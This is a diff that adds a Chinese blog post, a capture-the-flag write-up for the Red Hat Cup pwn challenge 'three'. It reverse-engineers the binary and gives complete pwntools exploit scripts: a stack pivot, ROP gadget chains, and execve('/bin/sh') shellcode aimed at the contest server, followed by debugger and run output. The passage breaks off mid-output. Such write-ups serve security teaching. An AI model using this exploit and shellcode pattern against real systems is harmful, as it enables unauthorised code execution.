@@ -1,0 +1,363 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    红帽杯PWN题-Three 解析 |
+    
+    Migraine</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<script src="/js/pace.min.js"></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body>
+<main class="content">
+  <section class="outer">
+  
+
+<article id="post-Three-Write" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
+  
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      红帽杯PWN题-Three 解析
+    </h1>
+  
+  
+
+
+
+
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2019/11/12/Three-Write/" class="article-date">
+  <time datetime="2019-11-12T01:31:28.000Z" itemprop="datePublished">2019-11-12</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+      </div>
+    
+
+    
+      
+    <div class="tocbot"></div>
+
+
+
+
+
+    
+
+    <div class="article-entry" itemprop="articleBody">
+      
+
+
+      
+
+      
+        <p>摘要：今年红帽杯的第一题PNW题新鲜出炉，主要的花费时间的还是在前期的逆向分析部分，利用方式并不难。这里快速出炉供给比完赛的大家做一个学习参考。</p>
+<a id="more"></a>
+
+<h1 id="0x00题目分析"><a href="#0x00题目分析" class="headerlink" title="0x00题目分析"></a>0x00题目分析</h1><p>题目名称：three<br>提示：three is a good number</p>
+<p>题目链接：<br><a href="https://github.com/migraine-sudo/PWN-/tree/master/%E5%AE%9E%E4%BE%8BPNW%E9%A2%98/1.%E7%BB%8F%E5%85%B8%E6%A0%88%E6%BA%A2%E5%87%BA/three-pwn/pwn" target="_blank" rel="noopener">下载地址</a></p>
+<p>刚拿到题目，在ubuntu上运行题目，发现没有任何回显。</p>
+<p>放入IDA发现有个函数，要调用flag文件，所以在本地新建一个flag文件，再次运行题目就能运行了。</p>
+<p><img src="https://s2.ax1x.com/2019/11/10/MKyDts.png" alt="img"> </p>
+<p><img src="https://s2.ax1x.com/2019/11/10/MKyccV.png" alt="img">)<img src="https://s2.ax1x.com/2019/11/10/MKyrhn.png" alt="img">)<img src="https://s2.ax1x.com/2019/11/10/MKyypq.png" alt="img"> </p>
+<p>使用IDA进行逆向分析，函数中有很多子函数，需要花时间看一下里面的大概功能是什么，以及结合动态调试能够达到事半功倍的效果。</p>
+<p>这是题目的主函数，这道题没有符号表所以可以通过搜索字符串来判断程序位置。</p>
+<p><strong><em>首先分析程序流程序</em></strong></p>
+<p><strong>第一次输入</strong>，要求提供一个INT类型的index，这个整形数据会在后文中与某个地址，但是这个INDEX实际并没有用，逆向过程中发现计算出的结果会被丢弃。详见sub_8048ADF</p>
+<p><strong>第二次输入</strong>，只能输入三个字节，写入v3的地址。而v3来源于sub_8071C50函数的返回值，通过逆向该函数可以发现，程序使用mmap向内存中申请一块可写内存。详细见sub_8071C50和mmap函数的特性。</p>
+<p><strong>第三次输入</strong>，写入v1参数为一个整形，并且限制长度。</p>
+<p>紧接着的第四次输入就是向bss段的地址0x80F6CC0写入v1长度的任意数据。</p>
+<p>也就是完成一次对bss段的任意数据写。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">int sub_8048B5C()</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  int result; &#x2F;&#x2F; eax</span><br><span class="line"></span><br><span class="line">  int v1; &#x2F;&#x2F; [esp+Ch] [ebp-1Ch]</span><br><span class="line"></span><br><span class="line">  int v2; &#x2F;&#x2F; [esp+10h] [ebp-18h]</span><br><span class="line"></span><br><span class="line">  void *v3; &#x2F;&#x2F; [esp+14h] [ebp-14h]</span><br><span class="line"></span><br><span class="line">  int v4; &#x2F;&#x2F; [esp+18h] [ebp-10h]</span><br><span class="line"></span><br><span class="line">  unsigned int v5; &#x2F;&#x2F; [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  v5 &#x3D; __readgsdword(0x14u);</span><br><span class="line"></span><br><span class="line">----第一次输入------</span><br><span class="line"></span><br><span class="line">  sub_80506F0((int)&quot;Give me a index:&quot;);</span><br><span class="line"></span><br><span class="line">  v2 &#x3D; sub_8048ADF(unk_80F6C80);</span><br><span class="line"></span><br><span class="line">  v3 &#x3D; (void *)sub_8071C50(0, 0x1000u, 7, 34, 0, 0);</span><br><span class="line"></span><br><span class="line">  sub_80506F0((int)&quot;Three is good number,I like it very much!&quot;);</span><br><span class="line"></span><br><span class="line">----第二次输入------</span><br><span class="line"></span><br><span class="line">  sub_8070EA0(0, v3, 3u);</span><br><span class="line"></span><br><span class="line">  sub_80506F0((int)&quot;Leave you name of size:&quot;);</span><br><span class="line"></span><br><span class="line">  ----第三次输入-------</span><br><span class="line"></span><br><span class="line">  sub_804FCF0((int)&quot;%d&quot;, &amp;v1);</span><br><span class="line"></span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt; 512 )</span><br><span class="line"></span><br><span class="line">​    sub_804F260(0);</span><br><span class="line"></span><br><span class="line">  sub_80506F0((int)&quot;Tell me:&quot;);</span><br><span class="line"></span><br><span class="line">  ----第四次输入-------</span><br><span class="line"></span><br><span class="line">  sub_8070EA0(0, &amp;unk_80F6CC0, v1 - 1);</span><br><span class="line"></span><br><span class="line">  ------触发跳转-----</span><br><span class="line"></span><br><span class="line">  v4 &#x3D; ((int (__cdecl *)(signed int))v3)(1);</span><br><span class="line"></span><br><span class="line">-------无用代码------</span><br><span class="line"></span><br><span class="line">  if ( v2 &#x3D;&#x3D; v4 )</span><br><span class="line"></span><br><span class="line">​    result &#x3D; sub_80506F0((int)&quot;1&quot;);</span><br><span class="line"></span><br><span class="line">  else</span><br><span class="line"></span><br><span class="line">​    result &#x3D; sub_80506F0((int)&quot;2&quot;);</span><br><span class="line"></span><br><span class="line">  if ( __readgsdword(0x14u) !&#x3D; v5 )</span><br><span class="line"></span><br><span class="line">​    sub_8073110();</span><br><span class="line"></span><br><span class="line">  return result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<p>使用mmap申请一块可执行内存</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">unsigned int __cdecl sub_8071C50(void *a1, size_t a2, int a3, int a4, int a5, unsigned int a6)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">  unsigned int result; &#x2F;&#x2F; eax</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">  if ( a6 &amp; 0xFFF )</span><br><span class="line"></span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">​    result &#x3D; -22;</span><br><span class="line"></span><br><span class="line">​    return sub_80754C0(result);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  result &#x3D; sys_mmap2(a1, a2, a3, a4, a5, a6 &gt;&gt; 12);</span><br><span class="line"></span><br><span class="line">  if ( result &gt; 0xFFFFF000 )</span><br><span class="line"></span><br><span class="line">​    return sub_80754C0(result);</span><br><span class="line"></span><br><span class="line">  return result;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>代码中唯一需要分析汇编的就是这一句，eax的来源便是v3，即上文我们写入三个字节的mmap分配的空间。执行到call eax的时候，程序就会调转到mmap分配的空间，写入的字节会被当作汇编代码执行。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">v4 &#x3D; ((int (__cdecl *)(signed int))v3)(1);</span><br><span class="line"></span><br><span class="line">.text:08048C56                 push    1</span><br><span class="line"></span><br><span class="line">.text:08048C58                 mov     eax, [ebp+var_14]</span><br><span class="line"></span><br><span class="line">.text:08048C5B                 call    eax</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.ax1x.com/2019/11/10/MKyBkj.png" alt="img"> </p>
+<p>接下里通过动态调试发现，当发生call eax的时候，ecx的值等于bss段的起始地址（0x80f6cc0）。还记得我们上文第三次输入对bss段的任意地址写吗？</p>
+<p>于是在可执行的v3地址写入一个栈翻转指令，将栈帧翻转到bss段，而在bss段埋下我们的ROP链。【bss段不可知执行，所以放弃往里面写shellcode 吧】</p>
+<p>使用pwntool生成我们的栈翻转指令码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">\&gt;&gt;&gt; asm(&quot;mov esp,ecx&quot;)</span><br><span class="line"></span><br><span class="line">&#39;\x89\xcc&#39;</span><br><span class="line"></span><br><span class="line">\&gt;&gt;&gt; asm(&quot;ret&quot;)</span><br><span class="line"></span><br><span class="line">&#39;\xc3&#39;</span><br></pre></td></tr></table></figure>
+
+
+<p>写出poc，验证程序流能够被控制。</p>
+<p>成功将esp翻转到bss段，并且执行了rop链。</p>
+<p>poc.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">#p&#x3D;remote(&quot;47.104.190.38&quot;,12001)</span><br><span class="line"></span><br><span class="line">p&#x3D;process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,&quot;b *0x08048C5B&quot;) #b *0x08048BDB</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;index:&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(str(10))</span><br><span class="line"></span><br><span class="line">print &quot;send index...&quot;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">payload1&#x3D;&quot;\x89\xcc\xc3&quot; #mov ecx,esp ret   </span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;much!&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">print &quot;[+]sending payload &quot;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;size:&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(str(512))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">rop_chain&#x3D;&quot;\xc5\x88\x04\x08&quot;</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Tell me:&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(rop_chain)</span><br><span class="line"></span><br><span class="line">print &quot;[+]sending payload2 &quot;</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>验证</p>
+<p>当程序运行到call eax时，eax指向地址存放着我们之前写入到mov esp,ecx;ret</p>
+<p><img src="https://s2.ax1x.com/2019/11/10/MKy610.png" alt="img">)<img src="https://s2.ax1x.com/2019/11/10/MKygXT.png" alt="img"> </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x&#x2F;20i $eax</span><br><span class="line"></span><br><span class="line">   0xf7ff8000:	mov    esp,ecx</span><br><span class="line"></span><br><span class="line">   0xf7ff8002:	ret    </span><br><span class="line"></span><br><span class="line">   0xf7ff8003:	add    BYTE PTR [eax],al</span><br><span class="line"></span><br><span class="line">   0xf7ff8005:	add    BYTE PTR [eax],al</span><br></pre></td></tr></table></figure>
+
+
+<p>执行之后esp指向bss段，而ret则执行了rop链。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">─────[stack ]────</span><br><span class="line"></span><br><span class="line">0x080f6cc0│+0x00: 0x080488c5  →  0x80488c5    push ebp	 ← $ecx, $esp</span><br><span class="line"></span><br><span class="line">0x080f6cc4│+0x04: 0x0a</span><br><span class="line"></span><br><span class="line">0x080f6cc8│+0x08: 0x00</span><br><span class="line"></span><br><span class="line">─────[ code:i386 ]────</span><br><span class="line"></span><br><span class="line">0xf7ff8002    ret    ← $pc</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+<h1 id="0x01-写EXP"><a href="#0x01-写EXP" class="headerlink" title="0x01 写EXP"></a>0x01 写EXP</h1><p>开始写利用，刚开始的思路就是使用ROP呼叫INT 0x80中断调用。</p>
+<p>只需要让如下配置寄存器eax=0xb,ebx-&gt;/bin/sh,ecx=edx=0,然后呼叫中断即可拿到shell</p>
+<p>写好了的利用链</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">\#p&#x3D;remote(&quot;47.104.190.38&quot;,12001)</span><br><span class="line"></span><br><span class="line">p&#x3D;process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line"></span><br><span class="line">gdb.attach(p,&quot;b *0x08048C5B&quot;) #b *0x08048BDB</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;index:&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(str(10))</span><br><span class="line"></span><br><span class="line">print &quot;send index...&quot;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">payload1&#x3D;&quot;\x89\xcc\xc3&quot; #mov ecx,esp ret    #\xff\xe1 jmp ecx</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;much!&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">print &quot;[+]sending payload &quot;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;size:&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(str(512))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">int_0x80&#x3D;0x080738bf #nop ; int 0x80</span><br><span class="line"></span><br><span class="line">rop_1&#x3D;0x080569a0 # xor eax, eax ; ret</span><br><span class="line"></span><br><span class="line">rop_2&#x3D;0x080e444d #  inc eax ; ret</span><br><span class="line"></span><br><span class="line">rop_3&#x3D;0x0806f05b # pop ebx ; ret</span><br><span class="line"></span><br><span class="line">rop_4&#x3D;0x08049d43 # xor ecx, ecx ; pop ebx ; mov eax, ecx ; pop esi ; pop edi ; pop ebp ; ret</span><br><span class="line"></span><br><span class="line">rop_5&#x3D;0x0805cc23 # xor edx, edx ; pop ebx ; mov eax, edx ; pop esi ; pop edi ; ret</span><br><span class="line"></span><br><span class="line">rop_6&#x3D;0x806f05b # pop ebx; ret</span><br><span class="line"></span><br><span class="line">nops&#x3D;0x90909090</span><br><span class="line"></span><br><span class="line">bin_sh&#x3D;0x080f6d20</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">rop_chain&#x3D;p32(rop_4)</span><br><span class="line"></span><br><span class="line">rop_chain+&#x3D;p32(nops)+p32(nops)+p32(nops)+p32(nops)</span><br><span class="line"></span><br><span class="line">rop_chain+&#x3D;p32(rop_5)</span><br><span class="line"></span><br><span class="line">rop_chain+&#x3D;p32(nops)+p32(nops)+p32(nops)</span><br><span class="line"></span><br><span class="line">\#eax &#x3D;0xb ebx-&gt;&#x2F;bin&#x2F;sh ecx&#x3D;0 edx&#x3D;0</span><br><span class="line"></span><br><span class="line">rop_chain+&#x3D;p32(rop_2)*0xb</span><br><span class="line"></span><br><span class="line">rop_chain+&#x3D;p32(rop_6)</span><br><span class="line"></span><br><span class="line">rop_chain+&#x3D;p32(bin_sh)</span><br><span class="line"></span><br><span class="line">rop_chain+&#x3D;p32(int_0x80)</span><br><span class="line"></span><br><span class="line">rop_chain+&#x3D;p32(0x487f5)</span><br><span class="line"></span><br><span class="line">rop_chain+&#x3D;&quot;&#x2F;bin&#x2F;bash&quot;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Tell me:&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(rop_chain)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>但是执行发生段错误，一开始以为问题应该还是在于rop链写在了bss段段开头，esp很容易越界进入别的段中。<br>和我之前ret2slove碰到的问题一样。但是调试之后发现，是因为int 0x80并没有成功呼叫中断，猜测可能是环境变量的原因。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gef➤  c</span><br><span class="line"></span><br><span class="line">Continuing.</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">Program terminated with signal SIGSEGV, Segmentation fault.</span><br><span class="line"></span><br><span class="line">The program no longer exists.</span><br></pre></td></tr></table></figure>
+
+
+
+
+<p>重新找寻方法，通过劫持程序流，可以让程序跳转回第二次输入[代码:sub_8070EA0(0, v3, 3u);，]只需要在内存中布置正确的参数，就能实现任意长度数据写入。</p>
+<p>注意参数入栈顺序，长度参数[argv_3]是第一个入栈的，所以只要让程序直接执行08048BD6，并且在之前先将一个较大的数据入栈就能达到写入任意长度数据。这样写入一个shellcode到这个可执行段中。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">.text:08048BD4                 push    3</span><br><span class="line"></span><br><span class="line">---&gt;控制程序跳转到这里</span><br><span class="line"></span><br><span class="line">.text:08048BD6                 push    [ebp+var_14]</span><br><span class="line"></span><br><span class="line">.text:08048BD9                 push    0</span><br><span class="line"></span><br><span class="line">.text:08048BDB                 call    sub_8070EA0</span><br></pre></td></tr></table></figure>
+
+
+<p>当重写v3内存之后，程序继续执行到call eax，此时就会再次执行我们写入的数据。</p>
+<p>而这次，程序将会给你一个shell</p>
+<p><strong>重新写利用</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p&#x3D;remote(&quot;47.104.190.38&quot;,12001)</span><br><span class="line"></span><br><span class="line">#p&#x3D;process(&quot;.&#x2F;pwn&quot;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p,&quot;b *0x08048C5B&quot;) #b *0x08048BDB</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;index:&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(str(10))</span><br><span class="line"></span><br><span class="line">print &quot;send index...&quot;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">payload1&#x3D;&quot;\x89\xcc\xc3&quot; #mov esp,ecx; ret    </span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;much!&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">print &quot;[+]sending payload &quot;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;size:&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(str(64))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">shellcode&#x3D;&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span><br><span class="line"></span><br><span class="line">read_to_mmap&#x3D;0x08048BD6</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">rop_chain&#x3D;p32(read_to_mmap)</span><br><span class="line"></span><br><span class="line">rop_chain+&#x3D;p32(80)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;Tell me:&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(rop_chain)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.sendline(shellcode)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;size:&quot;)</span><br><span class="line"></span><br><span class="line">p.sendline(str(1))</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>远程跑一下，拿到了flag。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">p0kerface@ubuntu:~&#x2F;Documents&#x2F;redhat$ python exp.py </span><br><span class="line"></span><br><span class="line">[+] Opening connection to 47.104.190.38 on port 12001: Done</span><br><span class="line"></span><br><span class="line">send index...</span><br><span class="line"></span><br><span 